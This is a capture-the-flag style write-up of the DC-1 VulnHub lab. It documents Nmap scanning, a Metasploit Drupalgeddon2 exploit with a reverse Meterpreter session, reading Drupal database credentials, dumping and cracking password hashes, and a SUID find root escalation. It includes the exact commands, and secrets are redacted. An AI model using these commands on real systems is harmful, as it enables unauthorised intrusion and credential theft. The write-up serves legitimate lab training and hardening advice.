# DC-1 --- VulnHub Penetration Testing Write-Up

> **Lab:** DC-1 (VulnHub)\
> **Focus:** Network discovery, service enumeration, web application
> assessment, initial access, post-exploitation enumeration, and local
> privilege escalation\
> **Attacker machine:** Kali Linux\
> **Target IP:** `192.168.56.104`\
> **Attacker lab IP:** `192.168.56.107`\
> **Status:** Root access achieved in the lab

------------------------------------------------------------------------

## Overview

This repository documents my approach to the DC-1 vulnerable-machine
lab. The aim was to identify the target on the isolated VirtualBox
network, enumerate exposed services, investigate the Drupal web
application, obtain an initial shell, inspect the host for useful
configuration information, and test for a local privilege-escalation
path.

The walkthrough combines a portfolio-style summary with a reproducible,
step-by-step methodology. Screenshots should be saved in the
`screenshots/` directory and named to match the references below.

**Scope and safety:** All testing described here was performed against
the intentionally vulnerable DC-1 virtual machine in my own lab network.
Do not run these techniques against systems without explicit
authorisation.

## Skills demonstrated

-   Host discovery and network enumeration with Nmap
-   TCP port and service/version enumeration
-   Web application reconnaissance
-   Drupal version and exposure research
-   Metasploit module selection and configuration
-   Obtaining and validating a Meterpreter session
-   Post-exploitation enumeration
-   Reviewing application configuration and database access
-   Identifying SUID binaries and assessing local privilege escalation
-   Documenting findings and evidence for a technical portfolio

## Lab setup

  Item:                                    Value
  --------------------------------------- -------------------------------------------------
 - Attacker OS:                             Kali Linux
 - Target:                                  DC-1
 - Target address:                          `192.168.56.104`
 - Attacker address on host-only network:   `192.168.56.107`
 - Network:                                 VirtualBox host-only network, `192.168.56.0/24`

> **Note:** IP addresses can differ between lab setups. Confirm the
> target address in your own environment before running any commands.

------------------------------------------------------------------------

# Walkthrough

## 1. Confirming network interfaces

I started by checking the network interfaces on Kali to identify the
address assigned to the host-only lab network.

``` bash
ip a
```

The `eth1` interface had the address `192.168.56.107/24`, which placed
the attacker on the same host-only subnet as the target.

![Screenshot 01 --- Kali network
interfaces](screenshots/01-network-interfaces.png)

**What this tells me:** Confirming the correct interface and subnet
helps ensure that discovery traffic is sent through the intended lab
network rather than an unrelated interface.

## 2. Discovering live hosts

I scanned the host-only subnet to identify active systems.

``` bash
nmap -sn 192.168.56.0/24
```

The scan reported four live hosts, including `192.168.56.104`, which I
selected for further enumeration.

![Screenshot 02 --- Nmap host
discovery](screenshots/02-host-discovery.png)

**Result:** The target was identified at `192.168.56.104`.

## 3. Enumerating ports and services

I ran a full TCP port scan with default scripts and service-version
detection.

``` bash
nmap -sC -sV -p- 192.168.56.104
```

The scan identified these open TCP ports:

  Port          Service   Observed detail
  ------------- --------- ----------------------------------------------------
  `22/tcp`      SSH       OpenSSH 6.0p1, Debian build
  `80/tcp`      HTTP      Apache httpd 2.2.22 on Debian; Drupal 7 identified
  `111/tcp`     rpcbind   RPC service
  `32999/tcp`   status    RPC status service

![Screenshot 03 --- Nmap service
enumeration](screenshots/03-service-enumeration.png)

**Analysis:** HTTP was the most promising initial avenue because the
server exposed a Drupal 7 website. The older software versions were
worth investigating, but version banners alone do not prove that a
specific vulnerability is exploitable. I used the later testing results
to validate the potential attack path.

## 4. Inspecting `robots.txt`

I checked the website's `robots.txt` file for paths and files that the
site administrator had asked web crawlers not to index.

``` bash
curl http://192.168.56.104/robots.txt
```

The response listed Drupal directories and files, including paths
associated with modules, themes, installation documentation, and
user-related routes.

![Screenshot 04 --- robots.txt response](screenshots/04-robots-txt.png)

**Analysis:** `robots.txt` is not an access-control mechanism. Entries
can, however, provide useful reconnaissance clues about the
application's structure and files worth reviewing.

## 5. Researching the Drupal version

I used SearchSploit to look for known Drupal 7 issues:

``` bash
searchsploit drupal 7
```

The results included several historical Drupal vulnerabilities,
including Drupalgeddon-related entries. I then searched the available
Metasploit modules:

``` text
msfconsole
search drupal 7
```

The module list included:

``` text
exploit/unix/webapp/drupal_drupalgeddon2
```

![Screenshot 05 --- SearchSploit
results](screenshots/05-searchsploit-drupal.png)

![Screenshot 06 --- Metasploit Drupal module
search](screenshots/06-metasploit-search.png)

**Analysis:** The search results helped me form a testable hypothesis. I
proceeded with the Drupalgeddon2 module against the isolated lab target
and recorded whether it actually established a session.

## 6. Configuring and running the exploit

Within Metasploit, I selected the Drupalgeddon2 module and checked its
options.

``` text
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS 192.168.56.104
set LHOST 192.168.56.107
show options
run
```

The target host was set to `192.168.56.104`; the reverse connection
handler used the attacker's host-only address, `192.168.56.107`, on port
`4444`.

The recorded output showed that a Meterpreter session opened
successfully.

![Screenshot 07 --- Metasploit module
configuration](screenshots/07-exploit-options.png)

![Screenshot 08 --- Meterpreter session
opened](screenshots/08-meterpreter-session.png)

**Result:** Initial access was achieved in the lab. The session ran as
the web-server account, `www-data`, rather than root.

## 7. Validating the session and enumerating files

I checked the session identity and listed the web root.

``` text
getuid
ls
```

The session identified the server username as `www-data`. The `/var/www`
directory contained Drupal files and a file named `flag1.txt`.

I read the first flag:

``` text
cat flag1.txt
```

The file contained a hint directing attention toward a configuration
file.

![Screenshot 09 --- Session identity and web-root
listing](screenshots/09-webroot-enumeration.png)

![Screenshot 10 --- First flag hint](screenshots/10-flag1.png)

**Analysis:** The flag suggested that configuration review was the next
logical step. Application configuration files can expose database
connection details when they are readable by an account that should not
have access to them.

## 8. Reviewing Drupal configuration

I navigated to Drupal's default site configuration directory:

``` text
cd sites
cd default
ls
cat settings.php
```

The `settings.php` file contained **Flag 2** and the Drupal application's database connection settings. This was an important discovery because
the configuration file exposed information that could be used to access
the local database.

The lab configuration disclosed:

-   Database name: `drupaldb`
-   Database username: `dbuser`
-   Database password: **[REDACTED]**
-   Database host: `localhost`

**Flag 2 evidence:** The screenshot below documents the discovery in
`settings.php`. Sensitive credential values should be obscured in any
public screenshot before uploading it to GitHub.

![Screenshot 11 --- Drupal settings.php and configuration
finding](screenshots/11-settings-php.png)

**Security finding:** Application database credentials were readable
from the compromised web application context. In a real environment,
credentials should be protected with restrictive file permissions,
least-privilege service accounts, and secure secret-management
practices.

> **Portfolio hygiene:** These are credentials from the intentionally
> vulnerable lab. Do not reuse them anywhere else. If adapting this
> write-up to a real assessment, redact secrets and never publish
> customer credentials, password hashes, private keys, or sensitive
> configuration values.

## 9. Opening a shell and checking database access

To use normal shell commands, I opened a shell from Meterpreter and
spawned a more interactive Bash shell using Python:

``` text
shell
which python
python -c 'import pty; pty.spawn("/bin/bash")'
```

From the shell, I used the discovered database account to connect to the
local MySQL service:

``` bash
mysql -u dbuser -p
```

At the password prompt, I entered the lab credential found in
`settings.php`. After connecting, I enumerated the available databases
and selected Drupal's database:

``` sql
SHOW DATABASES;
USE drupaldb;
SHOW TABLES;
SELECT * FROM users;
```

The database contained a Drupal `users` table with account records and
password hashes.

![Screenshot 12 --- Interactive
shell](screenshots/12-interactive-shell.png)

![Screenshot 13 --- MySQL database and
tables](screenshots/13-mysql-enumeration.png)

![Screenshot 14 --- Drupal users
table](screenshots/14-drupal-users-table.png)

**Analysis:** This confirmed that the exposed configuration values
allowed access to the application's database. Password hashes were
present, but they are not reproduced in this README.

## 10. Password-hash testing --- attempts and outcome

I saved the Drupal user hashes into a local file and tried
dictionary-based password recovery with John the Ripper and Hashcat.

Example commands from the lab session included:

``` bash
john users.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

``` bash
hashcat -m 7900 -a 0 --username users.txt /usr/share/wordlists/rockyou.txt
```

The John the Ripper attempt did not recover a password. A later
successful Hashcat run recovered the Drupal **admin password**. The
password itself is intentionally **redacted** in this public write-up
to avoid exposing credentials.

![Screenshot 15 --- John the Ripper
attempt](screenshots/15-john-attempt.png)

![Screenshot 16 --- Hashcat attempt and
status](screenshots/16-hashcat-attempt.png)

**Outcome:** Hashcat recovered the admin password; the value is withheld
from this public report. Password hashes and plaintext credentials are
not reproduced here.

**Lesson learned:** Validate the hash format and input-file structure,
verify tool options, and handle recovered credentials responsibly. A
public portfolio report can document the result without disclosing the
password.

## 11. Flag 3 — SUID `find` hint

The Drupal page titled **flag3** provides a direct clue for the next stage:

> Special PERMS will help FIND the passwd - but you'll need to -exec that
> command to work out how to get what's in the shadow.

![Screenshot 18 --- Flag 3 hint on the Drupal site](screenshots/18-flag3-hint.png)

This hint points toward files with special permissions, the `find`
command, and the password-shadow files. I followed up by enumerating
SUID binaries, which revealed `/usr/bin/find`. The hint is a lead rather
than proof by itself; the subsequent permission and shell checks provide
the evidence for the privilege-escalation result.

## 12. Finding the fourth flag hint

I inspected the `/home` directory and found a directory named `flag4`.
Inside it, `flag4.txt` contained a hint suggesting that the root flag
might be reachable by using the same general approach.

``` bash
cd /home
ls
cd flag4
ls
cat flag4.txt
```

![Screenshot 17 --- Fourth flag hint](screenshots/17-flag4-hint.png)

The hint prompted further local enumeration. Access to `/root` was
denied while the shell was running as `www-data`, so I needed to
identify a privilege-escalation opportunity.

## 13. Enumerating SUID binaries

I checked for files with the SUID permission bit:

``` bash
find / -perm -4000 2>/dev/null
```

The output included `/usr/bin/find`, along with other SUID binaries.

![Screenshot 19 --- SUID
enumeration](screenshots/19-suid-enumeration.png)

**Analysis:** SUID programs execute with the effective user ID of the
file owner. A SUID binary with unsafe functionality or configuration can
create a privilege-escalation path. Its presence alone is not sufficient
to establish exploitability; the effective permissions and behavior need
to be checked.

## 14. Escalating privileges with `find`

In this lab, I tested the available `find` binary and obtained a shell
with an effective user ID of root:

``` bash
find / -exec /bin/sh \; -quit
```

I validated the resulting privileges:

``` bash
id
whoami
```

The output showed `uid=33(www-data)` but `euid=0(root)`, and `whoami`
returned `root`.

![Screenshot 20 --- Root effective ID
validation](screenshots/20-root-id.png)

**Result:** Local privilege escalation succeeded in the intentionally
vulnerable VM. The process retained the original real user ID but had an
effective root identity, which allowed access to root-owned files.

## 15. Reading the final flag

With the elevated shell, I navigated to `/root` and listed its contents:

``` bash
cd /root
ls
cat thefinalflag.txt
```

The file confirmed successful completion of the DC-1 challenge.

![Screenshot 21 --- Final flag](screenshots/21-final-flag.png)

**Final result:** Root-level access was achieved and the final flag file
was read.

------------------------------------------------------------------------

# Findings Summary

  ------------------------------------------------------------------------------------
  ID                Finding           Evidence                       Impact
  ----------------- ----------------- ------------------------------ -----------------
  F-01              Drupal web        Nmap service/version output    Provides an
                    application       and `robots.txt`               externally
                    exposed                                          reachable
                                                                     application
                                                                     surface for
                                                                     further
                                                                     assessment

  F-02              Vulnerable Drupal Drupalgeddon2 module           Initial access as
                    attack path       established a Meterpreter      `www-data`
                                      session in the lab             

  F-03              Database          `sites/default/settings.php`   Enabled local
                    credentials                                      access to the
                    exposed in                                       Drupal database
                    application                                      
                    configuration                                    

  F-04              Database          Successful MySQL login and     Exposed
                    accessible using  `drupaldb` enumeration         application data,
                    the exposed                                      including account
                    credentials                                      hashes
                    
  F-05              SUID `find`       SUID enumeration and `id`      Root-level access
                    enabled privilege output showing `euid=0`        
                    escalation in                                    
                    this lab                               
                                       
  ------------------------------------------------------------------------------------

## Recommendations

The DC-1 lab illustrates several security controls that would help
prevent this attack path in a production environment:

1.  **Patch and maintain Drupal and the underlying operating system.**
    Retire unsupported software and apply security updates promptly.
2.  **Reduce exposed services.** Disable unnecessary network services
    and restrict management services to trusted networks.
3.  **Protect application configuration.** Limit file permissions and
    ensure application secrets are not readable by unnecessary accounts.
4.  **Apply least privilege to database accounts.** Grant only the
    permissions the application requires and avoid reusing credentials.
5.  **Review SUID programs.** Remove unnecessary SUID permissions and
    investigate binaries with dangerous functionality.
6.  **Harden the web-server account.** Restrict filesystem access and
    prevent the web process from gaining elevated privileges.
7.  **Monitor and test regularly.** Review logs, perform authorised
    vulnerability assessments, and validate remediation.

# Lessons Learned

-   Start with a methodical workflow: discover hosts, enumerate
    services, then investigate the most promising attack surface.
-   Use service banners and application clues to form hypotheses, but
    validate them with evidence.
-   Configuration files can expose sensitive information even when the
    application itself is the original point of entry.
-   Post-exploitation enumeration should be deliberate and focused on
    permissions, configuration, and system behavior.
-   A SUID result needs to be tested and verified; the `id` output
    provided the evidence that the effective identity changed.
-   Document failed attempts accurately: John the Ripper did not recover
    the password, while Hashcat did. Keep recovered passwords and other
    secrets redacted in public reports.
-   Keep screenshots organised and tie each one to a specific claim or
    stage in the report.
